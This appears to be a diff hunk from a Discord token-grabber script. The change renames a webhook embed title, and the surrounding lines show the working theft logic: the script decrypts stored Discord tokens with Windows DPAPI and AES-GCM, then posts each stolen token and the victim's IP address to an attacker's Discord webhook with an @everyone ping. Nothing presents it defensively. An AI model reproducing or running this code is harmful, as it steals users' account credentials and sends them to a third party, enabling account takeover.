@@ -45,7 +45,7 @@ def main():
             token
         token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
 
-        embed = DiscordEmbed(title=f"**Whispered got an HIT !**",
+        embed = DiscordEmbed(title=f"**WHISPERED got an HIT !**",
                                 url="https://github.com/NinjaPanic",
                                 description=f"""||@everyone||\n\n**### TOKEN:** ```yaml\n{token}``` \n**### IP:**```yaml\n{response.text}```""",
                                 color="9B26B6"
